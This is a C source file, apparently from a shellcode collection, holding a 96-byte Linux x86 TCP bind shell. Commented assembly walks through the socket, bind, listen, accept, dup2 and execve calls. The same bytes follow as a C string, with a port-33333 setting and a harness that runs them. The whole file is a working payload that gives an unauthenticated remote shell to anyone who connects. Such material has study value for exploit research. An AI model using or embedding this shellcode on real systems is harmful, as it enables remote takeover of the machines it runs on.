/*
 *  Linux x86 - TCP Bind Shell - 96 bytes
 *  Author: xmgv
 *  Details: https://xmgv.wordpress.com/2015/02/19/28/
 */

/*
global _start

section .text

_start:
    xor ebx, ebx    ; zero out ebx
    mul ebx         ; zero out eax, edx

    ;  socket(AF_INET, SOCK_STREAM, 0);
    mov al, 102     ; socketcall()
    mov bl, 1       ; socket()
    push edx        ; protocol
    push ebx        ; SOCK_STREAM
    push 2          ; AF_INET
    mov ecx, esp    ; load address of the parameter array
    int 0x80        ; call socketcall()

    ; eax contains the newly created socket
    mov esi, eax

    ; bind(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    mov al, 102     ; socketcall()
    inc ebx         ; bind() - 2
    push edx          ; INADDR_ANY
    push word 0x3582 ; port
    push word bx     ; AF_INET
    mov ecx, esp    ; point to the structure
    push 16         ; sizeof(struct sockaddr_in)
    push ecx        ; &serv_addr
    push esi        ; sockfd
    mov ecx, esp    ; load address of the parameter array
    int 0x80        ; call socketcall()

    ; listen(sockfd, backlog);
    mov al, 102     ; socketcall()
    mov bl, 4       ; listen()
    push edx        ; backlog
    push esi        ; sockfd
    mov ecx, esp    ; load address of the parameter array
    int 0x80        ; call socketcall()

    ; accept(sockfd, (struct sockaddr *)&cli_addr, &sin_size);
    mov al, 102     ; socketcall()
    mov bl, 5       ; accept()
    push edx          ; zero addrlen
    push edx          ; null sockaddr
    push esi        ; sockfd
    mov ecx, esp    ; load address of the parameter array
    int 0x80        ; call socketcall()

    ; eax contains the descriptor for the accepted socket
    xchg ebx, eax

    xor ecx, ecx    ; zero out ecx
    mov cl, 2       ; initialize counter

    loop:
        ; dup2(connfd, 0);
        mov al, 63  ; dup2()
        int 0x80
        dec ecx
        jns loop

    ; execve(“/bin/sh”, [“/bin/sh”, NULL], NULL);
    xchg eax, edx
    push eax        ; push null bytes (terminate string)
    push 0x68732f2f ; //sh
    push 0x6e69622f ; /bin
    mov ebx, esp    ; load address of /bin/sh
    push eax        ; null terminator
    push ebx        ; push address of /bin/sh
    mov ecx, esp    ; load array address
    push eax        ; push null terminator
    mov edx, esp    ; empty envp array
    mov al, 11      ; execve()
    int 0x80        ; call execve()
*/

#include <stdio.h>
#include <string.h>

#define PORT_NUMBER "\x82\x35" // 33333

unsigned char code[] =
"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0"
"\x66\x43\x52\x66\x68"
PORT_NUMBER
"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89"
"\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02"
"\xb0\x3f\xcd\x80\x49\x79\xf9\x92\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

int main(void) {
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}